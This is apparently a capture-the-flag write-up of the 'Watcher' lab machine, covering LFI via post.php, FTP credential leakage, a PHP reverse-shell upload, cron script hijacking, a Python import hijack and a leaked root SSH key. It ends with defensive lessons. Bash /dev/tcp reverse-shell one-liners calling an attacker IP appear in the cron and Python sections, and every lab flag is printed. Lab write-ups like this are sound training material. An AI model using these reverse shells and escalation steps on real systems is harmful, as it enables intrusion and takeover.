## Watcher
```Description
A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.
```
----
## Box Info
```IP 
10.48.144.178
```
---
## Reconnaissance
- Port Scan
```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 df:62:ed:bb:be:20:aa:f1:56:d7:2c:30:90:35:b7:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgLQbmTqhElSYiAmirupQg4KLJ39ZK8UcWeqqgG8U3BkUrQZNqf5Kdl05QbJEmeA9N1aZwQIhjoI13DI5kMtsSdbGHiVoT/UJqjzTVKTHEngMwCWHy8Q45rVlTtj0IpbOND9ogJWUYbQqkUwmKQATLv91bK5RGCZJqZZpdpBSWvm2gs6aYGxIGNRR2C3yOgYoKpb8doj5v7l+kMOfWkecN4YQ+XMBSgFNLc7SVaLBeBjxf2Hngp2KE0WXyicDFP1lk3TiXoRZSzZ8CDs5+M+e2/zTn7a2fA/FFtwx7hbaKkDEt/2ft3hz2ld0Q5HP+Z3bkRvpPrwytwYxlPVGqCGCLeY5EQFqBJ8UhGTyQncp2rrZOYO8TDoek42PZt5i2K2qlaIF/wl/D54m9kD7v1tvGvTSGxV0f9k1IgbPKfrTeBpSccD3FME7eGDZnvyk4Sjuof0Xh+ah8uPAK7E5RvtcMA0twSUJqocsVbjudZkfGjglOJ7ARe0CbpJwifyJgFs8=
|   256 49:84:c5:50:f1:e0:96:aa:52:3c:d7:5f:4a:a6:74:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCL5O9liUu4T1J3kotnc4YmQv14eFEAp6px7ToRXI/2XY7SpHDUHe7/qfgG2U5iCsS70YoS39Iqcnx+vkcLNe7A=
|   256 6b:a8:cc:1b:24:f7:f9:5e:8f:21:cf:e1:28:ad:e9:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBULC/6//xkgq3N8jAIvv37Tq4PUnUXojU7sLtqpGPsX
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Corkplacemats
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Jekyll v4.1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```
- Port - `21 - FTP`, `22 - SSH`, `80 - HTTP`
--- 
## Web Enumeration & LFI
- Web Page - Robots.txt
```bash
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```
- Web Page - Source Code
```html
<a href="post.php?post=striped.php">
<a href="post.php?post=round.php">
<a href="post.php?post=bunch.php">
```
- Look at the `URL` - `Post=File.jpg` try File Traversal
```bash
http://10.48.144.178/post.php?post=../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
systemd-timesync:x:112:115:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:113:118:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:114:119::/nonexistent:/usr/sbin/nologin
usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:116:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1004:1005:Ubuntu:/home/ubuntu:/bin/bash
```
- Valid Users - `mat`, `ubuntu`, `toby`
- First Flag - `/flag_1.txt`
```Flag
FLAG{robots_dot_text_what_is_next}
```
- Other File Mentioned In the `Robots.txt` is for the Path Traversal We discovered
```bash
http://10.48.144.178/post.php?post=secret_file_do_not_read.txt

Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777
```
## FTP Foothold → www-data Shell
- FTP Creds `ftpuser:givemefiles777`
```bash
$ ftp 10.48.144.178
Connected to 10.48.144.178.
220 (vsFTPd 3.0.5)
Name (10.48.144.178:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
229 Entering Extended Passive Mode (|||45820|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
```
- Flag_2.txt
```bash
$ cat flag_2.txt
FLAG{ftp_you_and_me}
```
- Look at the `Files` folder permission - we can write inside the folder/ can upload a reverse-shell
```bash
ftp> cd files
ftp> put rev.php
local: rev.php remote: rev.php
229 Entering Extended Passive Mode (|||44993|)
150 Ok to send data.
100% |********|  5495        9.90 MiB/s    00:00 ETA226 Transfer complete.
5495 bytes sent in 00:00 (82.57 KiB/s)
```
- Visit - `http://<ip>/post.php?post=/home/ftpuser/ftp/files/rev.php`
## www-data Enumeration
```bash
─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.136.113] from (UNKNOWN) [10.48.144.178] 43812
Linux ip-10-48-144-178 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 09:08:13 up 51 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
- Got Initial - Enumerate the machine 
```bash
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home
$ pwd
/home/mat
$ cat note.txt
Hi Mat,
I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.
Will
```
- More Enumeration
```bash
$ ls
bunch.php
css
flag_1.txt
images
index.php
more_secrets_a9f10a
post.php
robots.txt
round.php
secret_file_do_not_read.txt
striped.php
$ cat more_secrets_a9f10a
cat: more_secrets_a9f10a: Is a directory
$ cd more_secrets_a9f10a
$ ls
flag_3.txt
$ cat flag.txt
cat: flag.txt: No such file or directory
$ cat flag_3.txt
FLAG{lfi_what_a_guy}
```
- Flag 3 
```Flag
FLAG{lfi_what_a_guy}
```
## 5. Privilege Escalation: www-data → toby
```bash
$ ls /home/toby/
flag_4.txt
jobs
note.txt
$ cat note.txt
Hi Toby,
I've got the cron jobs set up now so don't worry about getting that done.
Mat
$ cat jobs
cat: jobs: Is a directory
$ cd jobs
$ ls
cow.sh
$ cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```
- Cronjob
```bash
$ cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```
- Enumeration
```bash
$ sudo -l
Matching Defaults entries for www-data on ip-10-48-144-178:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-48-144-178:
    (toby) NOPASSWD: ALL
```
- We can get shell as `toby`
```bash
$ ls
flag_4.txt
jobs
note.txt
$ sudo -u toby cat flag_4.txt
FLAG{chad_lifestyle}
```
- Let enumerate as user `toby`
```bash
$ sudo -u toby bash
ls -la
total 12
drwxrwxr-x 2 toby toby 4096 Dec  3  2020 .
drwxr-xr-x 6 toby toby 4096 Dec 12  2020 ..
-rwxr-xr-x 1 toby toby   46 Dec  3  2020 cow.sh
whoami
toby
id
uid=1003(toby) gid=1003(toby) groups=1003(toby)
```
- Overwrite File - `cow.sh` why this file - Hint Crontab
```bash
cd /home/toby/jobs
cat > cow.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.136.113/4446 0>&1
EOF
chmod +x cow.sh
cat cow.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.136.113/4446 0>&1
```
## 6. Privilege Escalation: toby → mat (Cron Job Abuse)
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4446
listening on [any] 4446 ...
connect to [192.168.136.113] from (UNKNOWN) [10.48.144.178] 45662
bash: cannot set terminal process group (4022): Inappropriate ioctl for device
bash: no job control in this shell
mat@ip-10-48-144-178:~$
```
- User `Mat` Enumeration
```
mat@ip-10-48-144-178:~/scripts$ whoami
mat
mat@ip-10-48-144-178:~/scripts$ id
uid=1002(mat) gid=1002(mat) groups=1002(mat)
mat@ip-10-48-144-178:~$ cat flag_5.txt
cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
mat@ip-10-48-144-178:~$ ls
cow.jpg  flag_5.txt  note.txt  scripts
mat@ip-10-48-144-178:~$ cat note.txt
Hi Mat,

I''ve set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
mat@ip-10-48-144-178:~$ cd scripts
mat@ip-10-48-144-178:~/scripts$ sudo -l
Matching Defaults entries for mat on ip-10-48-144-178:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on ip-10-48-144-178:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
mat@ip-10-48-144-178:~/scripts$
```
- Flag_5
```Flag5
FLAG{live_by_the_cow_die_by_the_cow}
```
## 7. Privilege Escalation: mat → will (Python Import Hijack)
```bash
pwd
/home/mat/scripts/
cat > cmd.py << 'EOF'
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.136.113/4444 0>&1'")

def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
EOF

cat cmd.py
python3 -c "import ast; ast.parse(open('cmd.py').read())" && echo "syntax OK"
```
- Reverse-shell 
```bash
will@ip-10-49-151-120:~$ whoami
will
will@ip-10-49-151-120:~$ id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
will@ip-10-49-151-120:~$ ls
flag_6.txt
will@ip-10-49-151-120:~$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
```
- Flag_6
```Flag6
FLAG{but_i_thought_my_script_was_secure}
```
## 8. Privilege Escalation: will → root (Leaked Backup Key)
`will`'s group membership (`adm`) suggested log access, but the real find was in `/opt/backups`:
```bash
will@ip-10-49-151-120:~$ ls
flag_6.txt
will@ip-10-49-151-120:~$ cd /opt/
will@ip-10-49-151-120:/opt$ ls
backups
will@ip-10-49-151-120:/opt$ cd backups
will@ip-10-49-151-120:/opt/backups$ ls
key.b64
```
- Private key which is encrypted in `base64`
```bash
curl http://<ip>:8080/key.b64 -o key.b64
```
upload on `cyberchef` convert from base64 into `plain`
```bash
nano id_rsa # paste the key inside it
chmod 600 id_rsa
ssh -i id_rsa root@<Ip>
root
root@ip-10-49-151-120:~# whoami
root
root@ip-10-49-151-120:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-49-151-120:~# cd
root@ip-10-49-151-120:~# ls
flag_7.txt  snap
root@ip-10-49-151-120:~# cat flag_7.txt
FLAG{who_watches_the_watchers}
```
- Flag_7
```Flag7
FLAG{who_watches_the_watchers}
```
## Flags Summary

|   |   |   |
|---|---|---|
|#|Flag|Where it came from|
|1|`FLAG{robots_dot_text_what_is_next}`|`robots.txt` → `/flag_1.txt`|
|2|`FLAG{ftp_you_and_me}`|FTP login as `ftpuser`|
|3|`FLAG{lfi_what_a_guy}`|Hidden dir via LFI (`more_secrets_a9f10a`)|
|4|`FLAG{chad_lifestyle}`|`sudo -u toby` (NOPASSWD ALL)|
|5|`FLAG{live_by_the_cow_die_by_the_cow}`|Cron hijack, shell as `mat`|
|6|`FLAG{but_i_thought_my_script_was_secure}`|Python import hijack, shell as `will`|
|7|`FLAG{who_watches_the_watchers}`|Leaked backup key, shell as `root`|

## Lessons & Takeaways

- **Path traversal in `post.php`** let an attacker read and execute arbitrary files on disk — user input used to build a file path must be strictly validated against a whitelist of known-safe files, not just passed through.
- **Plaintext credentials in notes/files reachable by LFI** turned one bug into full FTP access. Secrets should never sit in web-accessible paths, even ones not linked from the site.
- **A writable script executed by a higher-privileged cron job** is a direct privesc path. Any file a cron job executes must be owned and writable only by the user the job runs as (or root), never by the lower-privileged user who happens to live in that script's directory.
- **Trusting Python's import path** let a whitelist check be bypassed entirely, since the vulnerable import ran before the check. Scripts invoked via `sudo` as another user should not import local modules from directories writable by the invoking user — use absolute, locked-down module paths or avoid `sudo` script delegation altogether.
- **An unencrypted backup key sitting in `/opt/backups`** was the final straw: backups containing credentials or private keys need the same access controls as the credentials themselves, not "security by obscure path."

Together these show a common theme: each privilege boundary was crossed not through a kernel exploit, but through a small, specific trust mistake — an unvalidated path, a writable file, an import order, a forgotten backup.
# END